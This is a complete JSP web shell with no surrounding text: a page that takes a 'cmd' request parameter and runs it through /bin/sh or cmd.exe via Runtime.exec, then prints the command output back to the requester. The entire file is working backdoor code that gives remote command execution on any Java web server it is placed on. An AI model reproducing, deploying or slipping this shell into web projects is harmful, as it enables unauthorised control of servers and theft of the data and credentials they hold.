<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    String os = System.getProperty("os.name").toLowerCase();
    String shell = os.contains("win") ? "cmd.exe /c " : "/bin/sh -c ";
    Process p = Runtime.getRuntime().exec(shell + cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) {
        out.println(line);
    }
}
%>